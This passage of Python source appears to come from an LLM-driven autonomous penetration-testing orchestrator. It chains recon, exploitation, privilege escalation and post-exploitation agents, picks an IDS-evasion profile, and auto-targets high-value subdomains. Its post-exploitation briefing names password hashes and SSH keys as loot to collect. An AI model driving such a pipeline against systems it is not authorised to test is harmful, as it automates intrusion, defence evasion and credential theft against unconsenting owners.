                    self.phase_results[f"{loop_phase}_loop_{exploit_loops_done}"] = loop_result
                    self._accumulate_phase_intelligence(loop_phase, loop_result)
                except Exception as e:
                    self.log_warning(f"[LOOP] exploit↔postexploit loop failed: {e}")


        # ── STEP 4: Subdomain campaign (domain targets only) ──────────────────
        try:
            self._run_subdomain_campaign(parent_target=target, phase_scope=phase)
        except Exception as e:
            self.log_warning(f"Subdomain campaign error: {e}")

        # ── STEP 5: Mission summary ───────────────────────────────────────────
        return self._print_summary(target)

    def _run_subdomain_campaign(self, parent_target: str, phase_scope: str) -> None:
        """
        After completing the main target, run recon→enum→exploit on discovered
        subdomains (but DO NOT do subdomain enumeration for IP-only targets).
        """
        # Only for domains (simple heuristic)
        if not parent_target or parent_target.replace(".", "").isdigit():
            return
        if "." not in parent_target:
            return
        # Honor single-phase runs (don't spawn extra targets)
        if phase_scope != "full":
            return

        subs = list(self.mission_intelligence.get("confirmed_subdomains", []) or [])
        if not subs:
            return

        # Prioritize likely high-value subdomains first
        def _score(s: str) -> tuple[int, int, str]:
            low = s.lower()
            key = 9
            if any(p in low for p in ("admin.", "vpn.", "sso.", "auth.", "api.", "dev.", "staging.")):
                key = 0
            elif any(p in low for p in ("git", "jira", "jenkins", "grafana", "kibana", "portal")):
                key = 1
            return (key, len(low), low)

        subs = sorted({s for s in subs if s and s.endswith(parent_target)}, key=_score)[:15]
        if not subs:
            return

        self.console.print(Panel(
            f"[bold cyan]▶  SUBDOMAIN CAMPAIGN[/]\n"
            f"[white]Parent:[/] {parent_target}\n"
            f"[white]Subdomains:[/] {len(subs)} queued",
            border_style="cyan",
        ))

        # Run limited phases on each subdomain: recon→enumeration→exploitation
        for sub in subs:
            self.console.print(Panel(
                f"[bold cyan]▶  SUBTARGET: {sub}[/]",
                border_style="blue",
            ))
            for phase_name in ("recon", "enumeration", "exploitation"):
                try:
                    agent = self._get_agent(phase_name)
                    brief = self._build_agent_briefing(phase_name)
                    # Tag as subtarget so agents can adjust behavior if they want
                    brief["campaign"] = {"type": "subdomain", "parent": parent_target, "subtarget": sub}
                    result = agent.run(target=sub, briefing=brief)
                    self.phase_results[f"{phase_name}::{sub}"] = result
                    self._accumulate_phase_intelligence(phase_name, result)
                except Exception as e:
                    self.log_warning(f"Subdomain {sub} phase {phase_name} failed: {e}")
                    continue

    # ── Firewall Detection (Pre-Recon) ────────────────────────────────────────

    def _run_firewall_detection(self, target: str) -> None:
        """
        Run FirewallDetectionAgent before recon to detect IDS/firewalls.
        Sets evasion profile in MissionMemory for use by all subsequent agents.
        """
        try:
            self.console.print(Panel(
                "[bold yellow]▶  PRE-PHASE: FIREWALL DETECTION[/]\n"
                "[dim]Analyzing target for firewalls, IDS, and rate limiting...[/]",
                border_style="yellow",
            ))
            
            # Dynamic import to avoid circular dependencies
            from agents.firewall_agent import FirewallDetectionAgent
            
            firewall_agent = FirewallDetectionAgent(mission_memory=self.memory)
            result = firewall_agent.run(target=target, briefing={"quick_scan": True})
            
            # Firewall agent returns a flat dict, not {"success": ..., "result": ...}
            if isinstance(result, dict) and "evasion_profile" in result:
                profile = str(result.get("evasion_profile", "none"))
                detected = result.get("detected_technologies", []) or []
                config = result.get("evasion_config", {}) or {}
                
                # Store in MissionMemory for other agents
                self.memory.set_evasion_config(
                    profile=profile,
                    config=config,
                    detected_firewalls=detected,
                )
                
                # Display result
                if profile != "none":
                    firewall_list = ", ".join(detected) if detected else "unknown"
                    self.console.print(Panel(
                        f"[yellow]⚠ Firewalls detected: {firewall_list}[/]\n"
                        f"[cyan]Evasion profile: {profile.upper()}[/]\n"
                        f"[dim]All scans will use stealth techniques[/]",
                        title="[yellow]FIREWALL DETECTION COMPLETE[/]",
                        border_style="yellow",
                    ))
                else:
                    self.console.print(Panel(
                        "[green]✓ No firewalls detected[/]\n"
                        "[dim]Using aggressive scan timing[/]",
                        title="[green]FIREWALL DETECTION COMPLETE[/]",
                        border_style="green",
                    ))
                
                self.memory.log_action(
                    "Orchestrator",
                    "firewall_detection",
                    f"profile={profile}, detected={detected}"
                )
            else:
                # Detection failed — default to light evasion for safety
                self.log_warning("Firewall detection failed — using light evasion as fallback")
                self.memory.set_evasion_config(
                    profile="light",
                    config={"nmap_timing": "-T3", "nmap_flags": ["--max-retries", "2"]},
                    detected_firewalls=["unknown (detection failed)"],
                )
                
        except ImportError as e:
            self.log_warning(f"FirewallDetectionAgent not available: {e}")
        except Exception as e:
            self.log_warning(f"Firewall detection error: {e} — proceeding without evasion")

    # ── Phase helpers ─────────────────────────────────────────────────────────

    def _get_phases_to_run(self, phase: str) -> list[str]:
        """Determine which phases to execute based on the requested scope."""
        # Backward compatibility: vuln_scan is merged into enumeration.
        if phase == "vuln_scan":
            phase = "enumeration"
        
        # RESUME LOGIC: If mission already has a phase and we're asking for "full",
        # resume from the current phase instead of restarting from recon
        current_mm_phase = self.memory.state.get("phase", "")
        if phase == "full" and current_mm_phase and current_mm_phase != "init":
            # Map mission memory phases back to orchestrator phases
            mm_to_orch_phase = {
                "recon": "recon",
                "enum": "enumeration",
                "exploit": "exploitation",
                "privesc": "privesc",
                "postexploit": "postexploit",
                "report": "reporting"
            }
            resume_phase = mm_to_orch_phase.get(current_mm_phase, current_mm_phase)
            if resume_phase in self.ATTACK_CHAIN:
                self.log_info(f"📌 Resuming from phase: {resume_phase} (was {current_mm_phase})")
                idx = self.ATTACK_CHAIN.index(resume_phase)
                return self.ATTACK_CHAIN[idx:]
            else:
                self.log_warning(f"Unknown phase '{current_mm_phase}' in mission state, starting from recon")
                return list(self.ATTACK_CHAIN)
        
        if phase == "full":
            return list(self.ATTACK_CHAIN)
        if phase in self.ATTACK_CHAIN:
            idx = self.ATTACK_CHAIN.index(phase)
            # Run the requested phase + all subsequent ones
            return self.ATTACK_CHAIN[idx:]
        # Single-phase shorthand
        return [phase] if phase in self.ATTACK_CHAIN else list(self.ATTACK_CHAIN)

    def _check_phase_gate(self, phase_name: str) -> tuple[bool, str]:
        """
        Evidence-based phase gate — reads MissionMemory state only.
        NEVER uses LLM: only hard data from confirmed tool output counts.
        LLM cannot override a failed gate.

        Gate logic:
          recon       → always runs
          enumeration → need ≥1 live host in MissionMemory
          exploitation→ need exploitable_vulns >= 1 OR high/critical vulns from enum
          privesc     → need ≥1 confirmed shell (any user)
          postexploit → need ≥1 confirmed shell (any user is enough)
          reporting   → always runs
        """
        hosts = self.memory._state.get("hosts", {})
        
        # BUGFIX: Read vulns directly from MissionMemory, not phase_results
        # (phase_results is empty on resume, causing exploitation to be skipped)
        all_vulns_from_memory = []
        for host_data in hosts.values():
            all_vulns_from_memory.extend(host_data.get("vulnerabilities", []))
        
        exploitable_count = len([v for v in all_vulns_from_memory if v.get("exploitable")])
        high_critical_count = len([v for v in all_vulns_from_memory if v.get("cvss", 0) >= 7.0])

        if phase_name == "exploitation":
            if exploitable_count > 0:
                return True, (
                    f"Primary gate: {exploitable_count} exploitable vulns in MissionMemory"
                )

            # Secondary gate: high/critical vulns exist even if exploitability
            # reasoning was inconclusive.
            if high_critical_count >= 1:
                return True, (
                    f"Secondary gate: {high_critical_count} high/critical vulns (CVSS>=7.0)"
                )

            return False, (
                "Need exploitable_vulns >= 1 OR high/critical vulns. "
                f"Found: exploitable={exploitable_count}, high_critical={high_critical_count}"
            )

        gates: dict = {
            "recon": lambda: (
                True,
                "Always runs first",
            ),
            "reporting": lambda: (
                True,
                "Always runs",
            ),
            "enumeration": lambda: (
                len(hosts) > 0,
                f"Need live hosts. Found: {len(hosts)}",
            ),
            "privesc": lambda: (
                any(len(h.get("shells", [])) > 0 for h in hosts.values()),
                "Need ≥1 confirmed shell (any user)",
            ),
            "postexploit": lambda: (
                # Relaxed: any shell (not just root) enables post-exploit
                any(len(h.get("shells", [])) > 0 for h in hosts.values()),
                "Need ≥1 confirmed shell for post-exploit",
            ),
        }

        if phase_name not in gates:
            return True, "No gate defined — running by default"

        passed, reason = gates[phase_name]()
        return passed, reason

    def _get_hosts_summary(self) -> dict:
        """Compact host summary from MissionMemory for LLM prompts."""
        return {
            ip: {
                "ports": len(h.get("ports", [])),
                "vulns": len(h.get("vulnerabilities", [])),
                "shells": len(h.get("shells", [])),
            }
            for ip, h in self.memory._state.get("hosts", {}).items()
        }

    def _build_agent_briefing(self, phase_name: str) -> dict:
        """
        Builds a phase-specific briefing using the accumulated
        mission intelligence from all previous phases.

        Each phase gets exactly what it needs from what was found —
        not a generic briefing, a targeted intelligence package.

        For recon: minimal briefing (nothing known yet).
        For enumeration: inject recon technology findings.
        For exploitation: inject critical_path + attack vectors from enum.
        For privesc: inject shells obtained from exploitation.
        For postexploit: inject privesc paths.
        For reporting: inject full mission intelligence chain.
        """
        intel = self.mission_intelligence

        # ── Phase-specific intelligence extraction ─────────────────────────────

        if phase_name == "enumeration":
            # Enumeration needs: what recon found + pre-fetched CVE context
            hosts_summary = self._get_hosts_summary()
            prev_results = {
                k: v.get("result", {})
                for k, v in list(self.phase_results.items())[-2:]
            }
            return self._build_enumeration_briefing(hosts_summary, prev_results)

        if phase_name == "exploitation":
            # Exploitation needs: critical_path + all_attack_vectors
            # OPTIMIZATION: Skip heavy LLM synthesis, use direct intelligence passthrough
            
            # The fallback logic (lines 928-941) is actually better than waiting
            # 45+ minutes for LLM synthesis - ExploitationAgent has its own intelligence
            sc = intel.get("security_controls", {})
            evasion_needed = any(
                v not in [None, "", "none_detected", False]
                for v in sc.values()
            ) if isinstance(sc, dict) else False
            
            self.log_info(f"Exploit briefing: {len(intel.get('exploitable_vulns',[]))} exploitable vulns")
            
            return {
                "primary_target": intel.get("critical_path", {}),
                "fallback_vectors": intel.get("all_attack_vectors", []),
                "evasion_needed": evasion_needed,
                "confirmed_vulns": intel.get("exploitable_vulns", []),
                "mission_intelligence": intel,
                "note": "Briefing optimized - ExploitationAgent will handle attack selection",
            }

        if phase_name == "privesc":
            # PrivEsc needs: what shell we have + what privesc intelligence says
            shells = intel.get("shells_obtained", [])

            privesc_rag = ""
            try:
                hits = self.chroma.get_phase_rag_context(
                    phase="privesc",
                    query=f"linux privilege escalation {self.memory.target}",
                    n=3,
                )
                privesc_rag = "\n".join(h.get("text", "")[:200] for h in hits)
            except Exception:
                pass

            prompt = f"""Preparing privilege escalation briefing.

Target: {self.memory.target}
Shells obtained: {json.dumps(shells, default=str)[:300]}
Current confirmed services: {json.dumps(intel.get('confirmed_services', {}))[:200]}

Privilege escalation knowledge:
{privesc_rag[:400]}

MITRE chain so far: {intel.get('mitre_chain', [])[:8]}

Based on the shell access and target environment, determine:
1. Most likely privesc vectors for this Linux target
2. What information to gather first
3. What tools to run

Return JSON:
{{
  "current_access": "derived from shells data",
  "priority_vectors": [],
  "initial_recon_commands": "derived from privesc knowledge",
  "target_user": "root",
  "mitre_techniques": []
}}"""

            result = self._direct_llm(prompt, task_complexity="medium")
            if "error" not in result:
                result["shells"] = shells
                result["mission_intelligence"] = intel
                return result

            return {
                "shells": shells,
                "mission_intelligence": intel,
                # Linux-specific fallback vectors — LLM synthesis above handles
                # platform-aware selection when available
                "priority_vectors": ["SUID", "sudo -l", "cron", "kernel exploit"],
            }

        if phase_name == "postexploit":
            # PostExploit needs: root access confirmed + what to collect
            return {
                "shells": intel.get("shells_obtained", []),
                "credentials": intel.get("credentials_found", []),
                "mission_intelligence": intel,
                "collection_priorities": [
                    "password hashes", "ssh keys", "config files",
                    "network neighbors", "running services", "cron jobs",
                ],
            }

        if phase_name == "reporting":
            # Reporting needs the complete mission picture
            return {
                "mission_intelligence": intel,
                "mitre_chain": intel.get("mitre_chain", []),
                "confirmed_vulns": intel.get("confirmed_vulns", []),
                "exploitable": intel.get("exploitable_vulns", []),
                "shells": intel.get("shells_obtained", []),
                "credentials": intel.get("credentials_found", []),
                "phases_completed": intel.get("phases_completed", []),
            }

        # Recon must be non-blocking: avoid LLM briefing call before first wave.
        # If LLM is slow, this previously delayed/blocked the entire mission.
        if phase_name == "recon":
            hosts_summary = self._get_hosts_summary()
            tool_examples = _PHASE_TOOL_EXAMPLES.get(phase_name, [])
            return {
                "priority_targets": list(hosts_summary.keys()) or [self.memory.target],
                "known_info": hosts_summary,
                "attack_vectors": ["Standard recon techniques"],
                "avoid": [],
                "rag_queries": [f"recon {self.memory.target}", "CVE exploits"],
                "tool_commands": self._apply_placeholders(tool_examples[:3]),
                "special_instructions": f"Focus on recon for {self.memory.target}.",
                "mission_intelligence": intel,
            }

        # Generic fallback for non-recon / unspecified phases
        hosts_summary = self._get_hosts_summary()
        tool_examples = _PHASE_TOOL_EXAMPLES.get(phase_name, [])
        tool_block = "\n".join(self._apply_placeholders(tool_examples))

        rag_query = f"{phase_name} techniques {self.memory.target} exploitation"
        rag_snippets: list[str] = []
        try:
            mm_phase = self._PHASE_MAP.get(phase_name, phase_name)
            rag_hits = self.chroma.get_phase_rag_context(mm_phase, rag_query, n=5)
            rag_snippets = [
                f"[{h.get('source_collection', '?')}] {h['text'][:200]}"
                for h in rag_hits[:6]
            ]
        except Exception as e:
            self.log_warning(f"RAG context for briefing failed: {e}")

        rag_block = "\n".join(rag_snippets) or "No RAG hits — rely on known techniques."
        prev_results = {
            k: v.get("result", {})
            for k, v in list(self.phase_results.items())[-2:]
        }
        prompt = (
            f"Generate a pentest briefing for the '{phase_name}' agent.\n"
            f"Target: {self.memory.target}\n"
            f"Known hosts+ports: {json.dumps(hosts_summary)}\n"
            f"Recent results: {json.dumps(prev_results)[:300]}\n\n"
            f"KNOWLEDGE BASE CONTEXT:\n{rag_block}\n\n"
            f"AVAILABLE TOOL COMMANDS:\n{tool_block or 'Standard pentest tools'}\n\n"
            "ANTI-HALLUCINATION: Only cite CVEs/techniques from the KNOWLEDGE BASE "
            "CONTEXT above. If unknown, omit or mark as 'CVE-UNKNOWN'.\n\n"
            "Return JSON with EXACTLY these keys (no extras):\n"
            '{"priority_targets":["list of IPs/domains to focus on"],'
            '"known_info":{"key facts from previous phases"},'
            '"attack_vectors":["specific attack approaches with tool names"],'
            '"avoid":["things already tried or known dead-ends"],'
            '"rag_queries":["3 specific queries the specialist should run in RAG"],'
            '"tool_commands":["3-5 exact CLI commands the specialist should run first"],'
            '"special_instructions":"one sentence guidance for this phase"}'
        )

        result = self._direct_llm(prompt, task_complexity="medium")
        if "error" in result:
            return {
                "priority_targets": list(hosts_summary.keys()) or [self.memory.target],
                "known_info": hosts_summary,
                "attack_vectors": [f"Standard {phase_name} techniques"],
                "avoid": [],
                "rag_queries": [f"{phase_name} {self.memory.target}", "CVE exploits"],
                "tool_commands": self._apply_placeholders(tool_examples[:3]),
                "special_instructions": f"Focus on {phase_name} for {self.memory.target}.",
                "mission_intelligence": intel,
            }

        if not result.get("tool_commands") and tool_examples:
            result["tool_commands"] = self._apply_placeholders(tool_examples[:3])
        result["mission_intelligence"] = intel
        return result

    def _build_enumeration_briefing(
        self, hosts_summary: dict, prev_results: dict
    ) -> dict:
        """
        Enumeration-phase briefing - FAST HEURISTIC VERSION.
        
        OPTIMIZATION: The original version did 3 RAG queries × 8 technologies = 24 queries
        taking 10+ minutes on 147K docs. This version skips RAG/LLM synthesis entirely
        and returns a simple briefing based on mission state.
        
        Reads what ReconAgent wrote to MissionMemory and returns actionable briefing.
        """
        state = self.memory.state
        
        # Count discovered entities
        total_hosts = len(state.get("hosts", {}))
        total_ports = sum(len(h.get("ports", [])) for h in state.get("hosts", {}).values())
        
        # Extract technologies from action log (used for logging only)
        action_log = state.get("action_log", [])
        tech_findings = [
            a.get("result", "")
            for a in action_log
            if "technology" in str(a.get("action", "")).lower()
            and a.get("result")
        ]
        self.log_info(f"Enum briefing: {total_hosts} hosts, {total_ports} ports, {len(tech_findings)} techs")
        
        # Return lightweight briefing - EnumVulnAgent has its own RAG + intelligence
        return {
            "attack_priorities": [
                "Enumerate all open ports with version detection",
                "Run vulnerability scanners on discovered services",
                "Check for known CVEs in detected software versions",
            ],
            "technology_intelligence": [
                {"technology": t[:100], "note": "See EnumVulnAgent RAG for details"}
                for t in tech_findings[:3]
            ],
            "enumeration_focus": f"{total_ports} ports across {total_hosts} host(s) - full enumeration required",
            "hosts_summary": hosts_summary,
            "note": "Briefing optimized - EnumVulnAgent will perform its own RAG lookups per finding",
        }

    def _format_rag_compact(
        self, results: list, max_chars: int = 200
    ) -> str:
        """Compact RAG formatting — one-line per hit, pipe-separated."""
        if not results:
            return ""
        return " | ".join(
            str(r.get("text", ""))[:80].replace("\n", " ")
            for r in results[:3]
        )[:max_chars]

    def _analyze_phase_result(self, phase: str, result: dict) -> dict:
        """
        Deterministic post-phase analysis.
        Keeps phase transitions non-blocking while preserving gate-critical fields.
        """
        inner = result.get("result", {})
        findings_count = len(inner) if isinstance(inner, dict) else 0
        success = bool(result.get("success"))
        key_insight = f"Phase {phase} {'succeeded' if success else 'failed'}"

        if phase == "enumeration" and isinstance(inner, dict):
            exploitable = int(inner.get("exploitable_vulns", 0) or 0)
            total_vulns = len(inner.get("vulnerabilities", []) or [])
            findings_count = max(findings_count, total_vulns)
            key_insight = (
                f"Enumeration found {total_vulns} vulnerabilities "
                f"({exploitable} exploitable)"
            )

        return {
            "success": success,
            "findings_count": findings_count,
            "key_insight": key_insight,
            "critical_finding": False,
            "recommended_next": "continue",
        }

    def _update_attack_strategy(self, analysis: dict):
        """Log a strategy pivot triggered by a critical finding."""
        reason = analysis.get("strategy_update") or analysis.get("key_insight", "critical finding")
        self.console.print(Panel(
            f"[bold yellow]🔄 STRATEGY UPDATE[/]\n[white]{reason}[/]",
            border_style="yellow",
        ))
        self.memory.log_action("Orchestrator", "strategy_update", reason)

    def _critic_score(self, phase: str, result: dict) -> dict | None:
        """
        P1-1: Post-phase Critic — evaluate evidence quality via a short LLM call.

        Asks the reasoning model to score confidence (0–10) and list unresolved gaps.
        The call is capped at 30 s to avoid slowing the mission.

        Returns::

            {
                "confidence": float,   # 0.0–1.0
                "gaps": [str, ...],    # aspects still unknown after this phase
                "next_priority": str,  # recommended focus for next phase
            }

        Returns None on any failure so the caller is never blocked.
        """
        try:
            import concurrent.futures as _cf

            inner = result.get("result", {}) or {}
            success = result.get("success", False)

            # Build a compact evidence summary (avoid huge prompts)
            evidence_lines = []
            for key in ("hosts_found", "ports_found", "services_found", "vulnerabilities",
                        "exploitable_vulns", "shells_obtained", "loot_count", "error"):
                val = inner.get(key)
                if val is not None:
                    evidence_lines.append(f"  {key}: {val}")

            evidence = "\n".join(evidence_lines) or "  (no structured result)"

            prompt = (
                f"You are a pentesting team lead reviewing phase results.\n\n"
                f"PHASE: {phase}\n"
                f"OUTCOME: {'success' if success else 'failure'}\n"
                f"EVIDENCE:\n{evidence}\n\n"
                f"Score our confidence (0-10) in having a COMPLETE picture of the target after this phase.\n"
                f"List up to 3 aspects that are STILL UNKNOWN or need more investigation.\n"
                f"State the single highest-priority topic for the next phase.\n\n"
                f"Reply with ONLY valid JSON:\n"
                f'{{\"confidence\": <0-10>, \"gaps\": [\"...\", \"...\"], \"next_priority\": \"...\"}}'
            )

            def _invoke():
                raw = self.llm.invoke(prompt)
                return raw.content if hasattr(raw, "content") else str(raw)

            with _cf.ThreadPoolExecutor(max_workers=1) as ex:
                future = ex.submit(_invoke)
                try:
                    raw = future.result(timeout=30)
                except _cf.TimeoutError:
                    self.log_warning(f"[CRITIC] LLM timeout for phase '{phase}' — skipping critic")
                    return None

            # Parse JSON
            import re as _re
            m = _re.search(r'\{[^{}]+\}', raw, _re.DOTALL)
            if not m:
                return None
            data = json.loads(m.group())
            raw_conf = float(data.get("confidence", 5))
            confidence = max(0.0, min(1.0, raw_conf / 10.0))
            gaps = [str(g) for g in (data.get("gaps") or [])[:5]]
            next_priority = str(data.get("next_priority", ""))
            self.log_info(
                f"[CRITIC] Phase '{phase}': confidence={confidence:.2f}, "
                f"gaps={gaps}, next={next_priority}"
            )
            return {"confidence": confidence, "gaps": gaps, "next_priority": next_priority}

        except Exception as e:
            self.log_warning(f"[CRITIC] Failed for phase '{phase}': {e}")
            return None


    def _get_agent(self, phase_name: str) -> "BaseAgent":
        """
        Lazily import and instantiate the specialist agent for *phase_name*.
        This avoids circular imports at module load time.
        Raises ImportError if the module does not exist (should never happen
        once all specialists are implemented).
        """
        mapping = {
            "firewall":    ("agents.firewall_agent",    "FirewallDetectionAgent"),
            "recon":       ("agents.recon_agent",       "ReconAgent"),
            "enumeration": ("agents.enum_vuln_agent",   "EnumVulnAgent"),
            "vuln_scan":   ("agents.enum_vuln_agent",   "EnumVulnAgent"),
            "exploitation":("agents.exploitation_agent","ExploitationAgent"),
            "privesc":     ("agents.privesc_agent",     "PrivEscAgent"),
            "postexploit": ("agents.postexploit_agent", "PostExploitAgent"),
            "mitigation":  ("agents.mitigation_agent",  "MitigationAgent"),
            "reporting":   ("agents.reporting_agent",   "ReportingAgent"),
        }

        if phase_name not in mapping:
            raise ValueError(f"Unknown phase: {phase_name}")

        module_path, class_name = mapping[phase_name]
        try:
            module = importlib.import_module(module_path)
        except ModuleNotFoundError:
            # Fallback: try src-prefixed path
            module = importlib.import_module(f"src.{module_path}")

        cls = getattr(module, class_name)
        return cls(mission_memory=self.memory)

    # ── Summary ───────────────────────────────────────────────────────────────

    def _print_summary(self, target: str) -> dict:
        """Print the mission summary table and return the final result dict."""
        table = Table(title="[bold]Mission Summary[/]", border_style="cyan")
        table.add_column("Phase", style="bold white")
        table.add_column("Result", style="cyan")

        root_obtained = False
        report_path = None

        for phase_name in self.ATTACK_CHAIN:
            result = self.phase_results.get(phase_name)
            if result is None:
                table.add_row(phase_name.title(), "[dim]skipped[/]")
                continue

            inner = result.get("result", {})
            success = result.get("success", False)
            stub = result.get("stub", False)

            if phase_name == "recon":
                detail = f"{inner.get('hosts_found', '?')} hosts"
            elif phase_name == "enumeration":
                detail = (
                    f"{inner.get('services_found', '?')} services, "
                    f"{inner.get('exploitable_vulns', '?')} exploitable vulns"
                )
            elif phase_name == "vuln_scan":
                detail = f"{inner.get('exploitable_vulns', '?')} exploitable vulns"
            elif phase_name == "exploitation":
                shells = inner.get("shells_obtained", 0)
                detail = f"{shells} shell(s)"
            elif phase_name == "privesc":
                root = inner.get("root_obtained", False)
                root_obtained = bool(root)
                detail = f"root={'Yes' if root else 'No'}"
            elif phase_name == "postexploit":
                detail = f"{inner.get('loot_count', '?')} loot items"
            elif phase_name == "reporting":
                report_path = inner.get("report_path")
                detail = f"saved to {report_path}" if report_path else "complete"
            else:
                detail = "complete" if success else "failed"

            if stub:
                detail += " [dim](stub)[/]"
            color = "green" if success else "red"
            table.add_row(phase_name.title(), f"[{color}]{detail}[/]")

        self.console.print(table)
        
        # ══════════════════════════════════════════════════════════════════════
        # POST-MISSION LEARNING: Analyze what worked and what didn't
        # ══════════════════════════════════════════════════════════════════════
        self._post_mission_analysis(target, root_obtained)

        return {
            "mission_id": self.memory.mission_id,
            "target": target,
            "phases_completed": list(self.phase_results.keys()),
            "root_obtained": root_obtained,
            "report_path": report_path,
            "phase_results": self.phase_results,
        }
    
    def _post_mission_analysis(self, target: str, root_obtained: bool) -> None:
        """
        Analyze mission results to improve future performance.
        
        This method:
        1. Summarizes what techniques worked/failed
        2. Updates technique success rates in MissionMemory
        3. Stores lessons learned for RAG retrieval
        """
        try:
            self.console.print(Panel(
                "[cyan]📊 Analyzing mission results for learning...[/]",
                border_style="cyan",
            ))
            
            # Collect statistics
            stats = {
                "target": target,
                "root_obtained": root_obtained,
                "phases_run": list(self.phase_results.keys()),
                "successful_techniques": [],
                "failed_techniques": [],
                "services_encountered": [],
                "vulns_found": 0,
                "vulns_exploited": 0,
            }
            
            # Analyze enumeration results
            enum_result = self.phase_results.get("enumeration", {}).get("result", {})
            if isinstance(enum_result, dict):
                stats["vulns_found"] = int(enum_result.get("exploitable_vulns", 0) or 0)
                try:
                    vulns = enum_result.get("vulnerabilities", [])
                    if isinstance(vulns, list):
                        for v in vulns:
                            if isinstance(v, dict):
                                svc = v.get("service", "unknown")
                                if svc not in stats["services_encountered"]:
                                    stats["services_encountered"].append(svc)
                except (TypeError, AttributeError) as e:
                    self.log_warning(f"Could not iterate vulnerabilities: {e}")
            
            # Analyze exploitation results
            exploit_result = self.phase_results.get("exploitation", {}).get("result", {})
            if isinstance(exploit_result, dict):
                shells = int(exploit_result.get("shells_obtained", 0) or 0)
                stats["vulns_exploited"] = shells
                
                # Extract successful exploits
                try:
                    attempts = exploit_result.get("exploit_attempts", [])
                    if isinstance(attempts, list):
                        for attempt in attempts:
                            if isinstance(attempt, dict):
                                if attempt.get("success"):
                                    stats["successful_techniques"].append({
                                        "technique": attempt.get("exploit", "unknown"),
                                        "service": attempt.get("service", "unknown"),
                                        "cve": attempt.get("cve", ""),
                                    })
                                else:
                                    stats["failed_techniques"].append({
                                        "technique": attempt.get("exploit", "unknown"),
                                        "service": attempt.get("service", "unknown"),
                                        "reason": attempt.get("error", "unknown"),
                                    })
                except (TypeError, AttributeError) as e:
                    self.log_warning(f"Could not iterate exploit_attempts: {e}")
            
            # Print learning summary
            success_rate = (
                f"{stats['vulns_exploited']}/{stats['vulns_found']} exploitable vulns"
                if stats['vulns_found'] > 0 else "N/A"
            )
            
            summary_text = (
                f"[white]Target:[/] {target}\n"
                f"[white]Root obtained:[/] {'[green]Yes[/]' if root_obtained else '[red]No[/]'}\n"
                f"[white]Exploit success rate:[/] {success_rate}\n"
                f"[white]Services encountered:[/] {', '.join(stats['services_encountered'][:5]) or 'none'}\n"
            )
            
            if stats["successful_techniques"]:
                techs = [t["technique"] for t in stats["successful_techniques"][:3]]
                summary_text += f"[green]✓ Successful:[/] {', '.join(techs)}\n"
            
            if stats["failed_techniques"]:
                techs = [t["technique"] for t in stats["failed_techniques"][:3]]
                summary_text += f"[red]✗ Failed:[/] {', '.join(techs)}\n"
            
            self.console.print(Panel(
                summary_text,
                title="[cyan]MISSION LEARNING SUMMARY[/]",
                border_style="cyan",
            ))
            
            # Store mission summary for future RAG retrieval
            try:
                self.chroma.store_mission_finding(
                    mission_id=self.memory.mission_id,
                    agent="OrchestratorAgent",
                    finding=json.dumps(stats, default=str),
                    metadata={
                        "type": "mission_summary",
                        "target": target,
                        "root_obtained": root_obtained,
                        "success_rate": stats["vulns_exploited"] / max(1, stats["vulns_found"]),
                    },
                )
            except Exception as e:
                self.log_warning(f"Could not store mission summary: {e}")
            
            self.memory.log_action(
                "Orchestrator", "post_mission_analysis",
                f"root={root_obtained}, exploits={len(stats['successful_techniques'])}"
            )
            
        except Exception as e:
            self.log_warning(f"Post-mission analysis failed: {e}")
